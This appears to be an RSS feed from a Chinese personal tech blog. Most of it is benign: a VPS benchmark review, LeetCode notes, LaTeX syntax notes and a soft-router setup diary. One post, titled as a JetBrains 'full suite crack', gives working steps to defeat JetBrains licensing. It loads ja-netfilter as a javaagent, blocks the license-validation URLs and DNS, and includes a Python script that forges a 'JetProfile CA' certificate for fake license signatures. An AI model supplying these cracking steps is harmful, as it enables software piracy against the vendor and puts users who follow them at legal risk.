<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on</title><link>/posts/</link><description>Recent content in Posts on</description><generator>Hugo</generator><language>en</language><lastBuildDate>Wed, 05 Mar 2025 00:00:00 +0000</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>ClawCloud使用体验</title><link>/posts/vps_setup_clawcloud/</link><pubDate>Wed, 05 Mar 2025 00:00:00 +0000</pubDate><guid>/posts/vps_setup_clawcloud/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>快毕业了忙的飞起，上个服务器到期了我都没来得及管，现在写这篇博客还是在github的pages上，又接触了一些项目，想买个便宜好使的服务器玩玩。&lt;/p>
&lt;p>在论坛里搜到&lt;a href="https://claw.cloud/">ClawCloud&lt;/a>评价不错，刚好最近有活动优惠就入手了一台系统为Debian，之前一直用的ubuntu，这下也换个玩玩。记录一下机器怎么样和自己配置过程，也边以后自己看。&lt;/p>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>2C / 2G / 40G / 1T&lt;/th>
 &lt;th>$25.20 USD&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="测评">测评&lt;/h2>
&lt;p>部分测试结果：&lt;/p>
&lt;pre tabindex="0">&lt;code>VPS融合怪版本：2025.02.12
Shell项目地址：https://github.com/spiritLHLS/ecs
Go项目地址：https://github.com/oneclickvirt/ecs
---------------------基础信息查询--感谢所有开源项目---------------------
 CPU 型号 : Intel(R) Xeon(R) Platinum
 CPU 核心数 : 2
 CPU 频率 : 2500.002 MHz
 CPU 缓存 : L1: 32.00 KB / L2: 1.00 MB / L3: 33.00 MB
 AES-NI指令集 : ✔ Enabled
 VM-x/AMD-V支持 : ❌ Disabled
 内存 : 130.84 MiB / 1.85 GiB
 Swap : [ no swap partition or swap file detected ]
 硬盘空间 : 911.28 MiB / 40110.19 MiB
 启动盘路径 : /dev/vda1
 系统在线时间 : 0 days, 0 hour 5 min
 负载 : 1.02, 0.34, 0.12
 系统 : Debian GNU/Linux 12 (bookworm) (x86_64)
 架构 : x86_64 (64 Bit)
 内核 : 6.1.0-31-cloud-amd64
 TCP加速方式 : cubic
 虚拟化架构 : KVM
 NAT类型 : Full Cone
 IPV4 ASN : AS45102 Alibaba (US) Technology Co., Ltd.
 IPV4 位置 : Tokyo / Tokyo / JP
 IPV6 ASN : AS45102 Alibaba
 IPV6 位置 : Tokyo / Tokyo / Japan
 IPV6 子网掩码 : 128
----------------------CPU测试--通过sysbench测试-------------------------
 -&amp;gt; CPU 测试中 (Fast Mode, 1-Pass @ 5sec)
 1 线程测试(单核)得分: 		1062 Scores
 2 线程测试(多核)得分: 		1770 Scores
---------------------内存测试--感谢lemonbench开源-----------------------
 -&amp;gt; 内存测试 Test (Fast Mode, 1-Pass @ 5sec)
 单线程读测试:		5350.57 MB/s
 单线程写测试:		5815.83 MB/s
------------------磁盘dd读写测试--感谢lemonbench开源--------------------
 -&amp;gt; 磁盘IO测试中 (4K Block/1M Block, Direct Mode)
 测试操作		写速度					读速度
 100MB-4K Block		35.0 MB/s (8551 IOPS, 2.99s)		52.4 MB/s (12800 IOPS, 2.00s)
 1GB-1M Block		232 MB/s (221 IOPS, 4.52s)		208 MB/s (198 IOPS, 5.04s)
---------------------磁盘fio读写测试--感谢yabs开源----------------------
Block Size | 4k (IOPS) | 64k (IOPS)
 ------ | --- ---- | ---- ---- 
Read | 20.68 MB/s (5.1k) | 96.31 MB/s (1.5k)
Write | 20.69 MB/s (5.1k) | 96.82 MB/s (1.5k)
Total | 41.37 MB/s (10.3k) | 193.13 MB/s (3.0k)
 | | 
Block Size | 512k (IOPS) | 1m (IOPS)
 ------ | --- ---- | ---- ---- 
Read | 91.97 MB/s (179) | 91.36 MB/s (89)
Write | 96.85 MB/s (189) | 97.44 MB/s (95)
Total | 188.82 MB/s (368) | 188.81 MB/s (184)
&lt;/code>&lt;/pre>&lt;p>完整测试结果连接如下：&lt;/p></description></item><item><title>菜鸡解题1</title><link>/posts/leetcode/2024_09_02/</link><pubDate>Mon, 02 Sep 2024 00:00:00 +0000</pubDate><guid>/posts/leetcode/2024_09_02/</guid><description>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-text" data-lang="text">&lt;span style="display:flex;">&lt;span>关键：题目中关键信息
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>题解：自己或别人的解题思路
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>特解：这道题使用特殊方法
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Get：学到的点
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="2869-收集元素的最少操作次数">2869. 收集元素的最少操作次数&lt;/h2>
&lt;p>题解：从数组末端开始，标记数组，只有小于K的去求余标记，然后求和查一下是不是全1。全1返回结果&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Solution&lt;/span>(object):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">minOperations&lt;/span>(self, nums, k):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> :type nums: List[int]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> :type k: int
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> :rtype: int
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> flag &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">*&lt;/span> k
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(nums)&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> nums[i]&lt;span style="color:#f92672">&amp;lt;=&lt;/span>k:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> flag[nums[i]&lt;span style="color:#f92672">%&lt;/span>k] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> sum(flag) &lt;span style="color:#f92672">==&lt;/span> k:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> len(nums)&lt;span style="color:#f92672">-&lt;/span>i
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>题解：创建k的集合从集合里删除数字，为空返回。&lt;/p>
&lt;h2 id="2974-最小数字游戏">2974. 最小数字游戏&lt;/h2>
&lt;p>关键：bob先加入arr，Alice后加。为什么要刻意强调数组是&lt;strong>偶数长度&lt;/strong>？&lt;/p>
&lt;p>特解：排序后两两交换大的在前。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Solution&lt;/span>(object):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">numberGame&lt;/span>(self, nums):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> :type nums: List[int]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> :rtype: List[int]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> nums&lt;span style="color:#f92672">.&lt;/span>sort()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">0&lt;/span>, len(nums), &lt;span style="color:#ae81ff">2&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> nums[i], nums[i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> nums[i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>], nums[i]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> nums
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get：pop时候从后往前删，不然会越界。&lt;/p></description></item><item><title>JetBrains 全家桶破解</title><link>/posts/play_time/jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E7%A0%B4%E8%A7%A3/</link><pubDate>Wed, 30 Aug 2023 00:00:00 +0000</pubDate><guid>/posts/play_time/jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E7%A0%B4%E8%A7%A3/</guid><description>&lt;p>&lt;del>突然想开发了我的 IDEA 还是 2021 的，IDEA 和 Pycharm 还在机械硬盘，装个最新的到固态里面。教育邮箱懒得申请了，失效了又要麻烦续杯。写出来记录一下以后自己参考。&lt;/del>&lt;/p>
&lt;blockquote>
&lt;p>所提供的内容仅供学习交流使用,严禁用于商业用途,请于下载后24小时内删除。&lt;/p>&lt;/blockquote>
&lt;h2 id="准备">准备&lt;/h2>
&lt;p>破解使用的是 &lt;a href="https://gitee.com/ja-netfilter/ja-netfilter">ja-netfilter&lt;/a>：https://gitee.com/ja-netfilter/ja-netfilter。release 下载以后解压。&lt;/p>
&lt;p>&lt;img src="https://img.braindance.top/article/2023/10/07/6520f05f102ea.png" alt="1696657544950.png">&lt;/p>
&lt;p>&lt;code>config&lt;/code> 配置文件默认为空，需要添加一些配置。plugins 是可以加载一些其他联动插件，本文使用的方法不用其他插件。&lt;/p>
&lt;p>找到 IDEA 或者 Pycharm 的 &lt;code>Help&lt;/code> &amp;mdash;&amp;gt; &lt;code>Edit Custom VM Options&lt;/code> 添加启动参数，路径是&lt;code>ja-netfilter&lt;/code>的 jar 包路径。&lt;/p>
&lt;pre tabindex="0">&lt;code>-javaagent:C:\\path\\to\\ja-netfilter.jar
&lt;/code>&lt;/pre>&lt;p>&lt;strong>Jetbrain全家桶在2022.2版本以上默认启用Java17&lt;/strong>，所以用的时候需要在 VM Options 里额外增加下面两行参数。&lt;/p>
&lt;pre tabindex="0">&lt;code>--add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED
--add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED
&lt;/code>&lt;/pre>&lt;p>在这里修改的 VM Options 配置文件路径是 C 盘下的本版本全局配置，也可以修改添加到安装目录下的 bin 目录中的 &lt;code>idea64.exe.vmoptions&lt;/code> 配置文件。&lt;/p>
&lt;h2 id="修改其他配置">修改其他配置&lt;/h2>
&lt;p>修改 &lt;code>config&lt;/code> 修改文件夹下的&lt;/p>
&lt;p>&lt;code>congig/url.conf&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>[URL]
PREFIX,https://account.jetbrains.com/lservice/rpc/validateKey.action
PREFIX,https://account.jetbrains.com.cn/lservice/rpc/validateKey.action
&lt;/code>&lt;/pre>&lt;p>&lt;code>congig/dns.conf&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>[DNS]
EQUAL,jetbrains.com
&lt;/code>&lt;/pre>&lt;h2 id="激活">激活&lt;/h2>
&lt;h3 id="使用-power-插件">使用 power 插件&lt;/h3>
&lt;p>power 插件被作者成为非对称加密的屠龙刀，这种方式激活可以自定义信息，并且可以设置全家桶激活。&lt;/p>
&lt;p>参考大佬&lt;a href="https://xuzhengtong.com/2022/07/25/ja-netfilter/ja-netfilter-plugins-power/">博客文章&lt;/a> 本地运行两个 python 文件，一个用于生成本地证书签名文件&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> datetime
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> cryptography &lt;span style="color:#f92672">import&lt;/span> x509
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> cryptography.hazmat.backends &lt;span style="color:#f92672">import&lt;/span> default_backend
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> cryptography.hazmat.primitives &lt;span style="color:#f92672">import&lt;/span> hashes, serialization
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> cryptography.hazmat.primitives.asymmetric &lt;span style="color:#f92672">import&lt;/span> rsa
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> cryptography.x509.oid &lt;span style="color:#f92672">import&lt;/span> NameOID
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>one_day &lt;span style="color:#f92672">=&lt;/span> datetime&lt;span style="color:#f92672">.&lt;/span>timedelta(days&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ten_day &lt;span style="color:#f92672">=&lt;/span> datetime&lt;span style="color:#f92672">.&lt;/span>timedelta(days&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3650&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>today &lt;span style="color:#f92672">=&lt;/span> datetime&lt;span style="color:#f92672">.&lt;/span>datetime&lt;span style="color:#f92672">.&lt;/span>today()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>yesterday &lt;span style="color:#f92672">=&lt;/span> today &lt;span style="color:#f92672">-&lt;/span> one_day
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>tomorrow &lt;span style="color:#f92672">=&lt;/span> today &lt;span style="color:#f92672">+&lt;/span> ten_day
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>private_key &lt;span style="color:#f92672">=&lt;/span> rsa&lt;span style="color:#f92672">.&lt;/span>generate_private_key(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> public_exponent&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">65537&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> key_size&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">4096&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> backend&lt;span style="color:#f92672">=&lt;/span>default_backend()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>public_key &lt;span style="color:#f92672">=&lt;/span> private_key&lt;span style="color:#f92672">.&lt;/span>public_key()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>builder &lt;span style="color:#f92672">=&lt;/span> x509&lt;span style="color:#f92672">.&lt;/span>CertificateBuilder()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>builder &lt;span style="color:#f92672">=&lt;/span> builder&lt;span style="color:#f92672">.&lt;/span>subject_name(x509&lt;span style="color:#f92672">.&lt;/span>Name([
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x509&lt;span style="color:#f92672">.&lt;/span>NameAttribute(NameOID&lt;span style="color:#f92672">.&lt;/span>COMMON_NAME, &lt;span style="color:#e6db74">&amp;#39;MoYuno-from-2022-07-25&amp;#39;&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>]))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>builder &lt;span style="color:#f92672">=&lt;/span> builder&lt;span style="color:#f92672">.&lt;/span>issuer_name(x509&lt;span style="color:#f92672">.&lt;/span>Name([
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x509&lt;span style="color:#f92672">.&lt;/span>NameAttribute(NameOID&lt;span style="color:#f92672">.&lt;/span>COMMON_NAME, &lt;span style="color:#e6db74">&amp;#39;JetProfile CA&amp;#39;&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>]))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>builder &lt;span style="color:#f92672">=&lt;/span> builder&lt;span style="color:#f92672">.&lt;/span>not_valid_before(yesterday)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>builder &lt;span style="color:#f92672">=&lt;/span> builder&lt;span style="color:#f92672">.&lt;/span>not_valid_after(tomorrow)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>builder &lt;span style="color:#f92672">=&lt;/span> builder&lt;span style="color:#f92672">.&lt;/span>serial_number(x509&lt;span style="color:#f92672">.&lt;/span>random_serial_number())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>builder &lt;span style="color:#f92672">=&lt;/span> builder&lt;span style="color:#f92672">.&lt;/span>public_key(public_key)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>certificate &lt;span style="color:#f92672">=&lt;/span> builder&lt;span style="color:#f92672">.&lt;/span>sign(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> private_key&lt;span style="color:#f92672">=&lt;/span>private_key, algorithm&lt;span style="color:#f92672">=&lt;/span>hashes&lt;span style="color:#f92672">.&lt;/span>SHA256(),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> backend&lt;span style="color:#f92672">=&lt;/span>default_backend()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>private_bytes &lt;span style="color:#f92672">=&lt;/span> private_key&lt;span style="color:#f92672">.&lt;/span>private_bytes(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> encoding&lt;span style="color:#f92672">=&lt;/span>serialization&lt;span style="color:#f92672">.&lt;/span>Encoding&lt;span style="color:#f92672">.&lt;/span>PEM,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> format&lt;span style="color:#f92672">=&lt;/span>serialization&lt;span style="color:#f92672">.&lt;/span>PrivateFormat&lt;span style="color:#f92672">.&lt;/span>TraditionalOpenSSL,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> encryption_algorithm&lt;span style="color:#f92672">=&lt;/span>serialization&lt;span style="color:#f92672">.&lt;/span>NoEncryption())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>public_bytes &lt;span style="color:#f92672">=&lt;/span> certificate&lt;span style="color:#f92672">.&lt;/span>public_bytes(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> encoding&lt;span style="color:#f92672">=&lt;/span>serialization&lt;span style="color:#f92672">.&lt;/span>Encoding&lt;span style="color:#f92672">.&lt;/span>PEM)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;ca.key&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;wb&amp;#34;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> fout:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fout&lt;span style="color:#f92672">.&lt;/span>write(private_bytes)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;ca.crt&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;wb&amp;#34;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> fout:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fout&lt;span style="color:#f92672">.&lt;/span>write(public_bytes)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>还有一个生成 key 和伪造验签&lt;/p></description></item><item><title>LaTex数学公式</title><link>/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/</link><pubDate>Sun, 21 May 2023 00:00:00 +0000</pubDate><guid>/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/</guid><description>&lt;p>&lt;a href="https://blog.csdn.net/m0_55746113/article/details/122728673">https://blog.csdn.net/m0_55746113/article/details/122728673&lt;/a>&lt;/p>
&lt;h2 id="标注符号">标注符号&lt;/h2>
&lt;h3 id="上下标">上下标&lt;/h3>
&lt;p>上标符号为“^”、下标符号为“_” ，多于一个字符用&lt;code>{}&lt;/code>包含，例如&lt;code>2^r&lt;/code>、&lt;code>a_5&lt;/code>&lt;/p>
&lt;p>$2^r,a_5,A_{n+1}$&lt;/p>
&lt;h3 id="平均值箭头向量等">平均值、箭头、向量等&lt;/h3>
&lt;p>加^号：&lt;code>\hat{x}&lt;/code>&lt;/p>
&lt;p>加横线：&lt;code>\overline{x}&lt;/code>&lt;/p>
&lt;p>加^：&lt;code>\widehat{x}&lt;/code>&lt;/p>
&lt;p>加波浪线：&lt;code>\widetilde{x}&lt;/code>&lt;/p>
&lt;p>加一个点：&lt;code>\dot{x}&lt;/code>&lt;/p>
&lt;p>加两个点：&lt;code>\ddot{x}&lt;/code>&lt;/p>
&lt;p>$\hat x,\overline x,\widehat x,\widetilde x,\dot x,\ddot x$&lt;/p>
&lt;h3 id="加粗">加粗&lt;/h3>
&lt;p>矩阵字母一般会用加粗的罗马体来表示。&lt;code>\bf&lt;/code>&lt;/p>
&lt;h2 id="根号">根号&lt;/h2>
&lt;p>&lt;code>\sqrt{}&lt;/code>&lt;/p>
&lt;h2 id="希腊字母表">希腊字母表&lt;/h2>
&lt;p>&lt;img src="https://img.braindance.top/article/2023/10/12/6527dfcd9db91.png" alt="1697112011353.png">&lt;/p>
&lt;h2 id="运算符号">运算符号&lt;/h2>
&lt;h3 id="加减乘除">加减乘除&lt;/h3>
&lt;p>&lt;code>+&lt;/code> 和 &lt;code>-&lt;/code>。&lt;code>\times&lt;/code> 和 &lt;code>\div&lt;/code>。点乘用 &lt;code>\cdot&lt;/code>&lt;/p>
&lt;p>$ +,-,\times,\div,\cdot$&lt;/p>
&lt;h3 id="大于小于约等于">大于、小于、约等于&lt;/h3>
&lt;p>大于小于直接 &lt;code>&amp;gt;&lt;/code> 、 &lt;code>&amp;lt;&lt;/code>&lt;/p>
&lt;p>大于等于 &lt;code>\ge&lt;/code>，小于等于 &lt;code>\le&lt;/code>&lt;/p>
&lt;p>远大于 &lt;code>\gg&lt;/code>，远小于 &lt;code>\ll&lt;/code>&lt;/p>
&lt;p>不等于 &lt;code>\ne&lt;/code>&lt;/p>
&lt;p>约等于 &lt;code>\approx&lt;/code>&lt;/p>
&lt;p>$&amp;gt;,&amp;lt;,\ge,\le,\gg,\ll,\ne,\approx$&lt;/p>
&lt;h3 id="分式和根式">分式和根式&lt;/h3>
&lt;p>&lt;code>\frac{分子}{分母}&lt;/code>或&lt;code>\frac 分子 分母&lt;/code>。如&lt;/p>
&lt;p>$ \frac{1}{2}$&lt;/p>
&lt;h3 id="交集并集">交集并集&lt;/h3>
&lt;p>交集用 &lt;code>\cap&lt;/code>&lt;/p>
&lt;p>并集用 &lt;code>\cup&lt;/code>&lt;/p>
&lt;p>$\cap,\cup$&lt;/p>
&lt;h3 id="属于不属于">属于不属于&lt;/h3>
&lt;p>属于用 &lt;code>\in&lt;/code>&lt;/p>
&lt;p>不属于用 &lt;code>\notin&lt;/code>&lt;/p>
&lt;p>$\in,\notin$&lt;/p></description></item><item><title>软路由日记(一)</title><link>/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/</link><pubDate>Fri, 03 Feb 2023 00:00:00 +0000</pubDate><guid>/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>在学校疫情期间买了一个 j4125 的软路由，一直等到回家过了很久才到手，因为买的是裸机，还有些配件是在别的店买的，回家以后发现地址只能在区以内修改，只能取消订单重新下了单。&lt;/p>
&lt;p>最后的配件列表如下：&lt;/p>
&lt;ul>
&lt;li>DDR4 8G * 2&lt;/li>
&lt;li>128G msata * 1&lt;/li>
&lt;li>金士顿 480G sata * 1 （送的有sata的电源线和数据线，要注意下电源线用那种带拐角的，不然不好插上去）&lt;/li>
&lt;li>DV 12V5A 电源 5.5mm&lt;/li>
&lt;/ul>
&lt;p>原来咸鱼上买了假三星内存条回来插上发现不能用，所以把笔记本上的两根 8G 换下来了，然后又觉得电脑单根有点卡，所以又下了一单，哈哈哈现在电脑上是假三星 32G。电源是发货最慢的，我把家里路由器机顶盒的电源找了个遍，发现都插不上去，重要的是同样是圆口的插孔，还分好多不一样的尺寸，这个是最大的 5.5mm 的，最后出去找了一家买监控的店，在压箱货里面找到了一个非常非常塑料感的电源，卖了我 30 块，我现在还记得我进去的时候老板正在玩魔兽骑着坐骑跑路。&lt;/p>
&lt;p>再安利两个视频，我前期了解主要通过这两个 up 的视频学习的。&lt;/p>
&lt;p>&lt;a href="https://www.bilibili.com/video/BV1WL411P7yN">保姆级J4125英特尔2.5G安装PVE+Ikuai+Openwrt&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.bilibili.com/video/BV13b4y1J7dX">用U盘直接给J4125软路由安装OpenWrt固件，超简单小白也看得懂&lt;/a>&lt;/p>
&lt;h2 id="准备材料">准备材料&lt;/h2>
&lt;p>需要准备：&lt;/p>
&lt;ul>
&lt;li>U盘一个。制作引导盘，安装完成以后可以恢复&lt;/li>
&lt;li>键盘。安装向导需要一些配置&lt;/li>
&lt;li>网线。安装完成以后可以访问 web页面配置&lt;/li>
&lt;/ul>
&lt;p>软件安装包：&lt;/p>
&lt;ul>
&lt;li>Restful。官网：&lt;a href="http://rufus.ie/zh/">http://rufus.ie/zh/&lt;/a>&lt;/li>
&lt;li>pve镜像。官网：&lt;a href="https://www.proxmox.com/en/downloads">https://www.proxmox.com/en/downloads&lt;/a>。要下载名称有 ISO Installer 才是系统镜像文件&lt;/li>
&lt;/ul>
&lt;h2 id="restful-制作安装">Restful 制作安装&lt;/h2>
&lt;p>插上U盘，打开 Restful 写入镜像文件，设备选择U盘盘符，引导类型选择镜像文件，然后右边选择下载好的 PVE 镜像文件，其他的配置默认即可。&lt;/p>
&lt;p>&lt;img src="https://img.braindance.top/article/2023/02/03/63dcb88214c79.png" alt="">&lt;/p>
&lt;p>确认以后会有一个弹窗选择 DD 镜像模式写入。用个网上找的图片&lt;/p>
&lt;p>&lt;img src="https://qnam.smzdm.com/202202/24/62174f66812b27757.png_e1080.jpg" alt="">&lt;/p>
&lt;p>引导盘算制作好了。如果引导盘安装完成以后想要恢复成原来U盘，插上U盘，注意一下识别的盘符，引导类型选择为&lt;code>非可引导&lt;/code>重新格式化一下即可，文件系统 FAT32 不能写入超过 2G 大小的文件，所以我一般选 NTFS。&lt;/p>
&lt;h2 id="虚拟机网段规划分配">虚拟机网段规划分配&lt;/h2>
